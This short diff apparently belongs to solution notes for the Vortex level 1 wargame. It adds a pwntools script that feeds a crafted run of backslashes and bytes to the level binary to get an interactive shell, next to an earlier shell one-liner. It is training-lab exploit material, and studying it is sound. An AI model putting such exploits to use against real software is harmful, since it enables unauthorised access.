@@ -6,3 +6,16 @@ stdbuf -o267 python -c "print ('\\\'*261) + '\xca' + '\\\'*4  + 's' + 'vim\n' * 
 Could have been:
 
 (./exploit; cat)|./binary
+
+
+Or using the python pwnlib:
+
+
+from pwn import *
+p = process('/vortex/vortex1')
+p.clean()
+p.send('\\'*261 + '\xca' + '\\'*4 + 's')
+p.send('ls\n')
+p.clean()
+p.interactive()
+
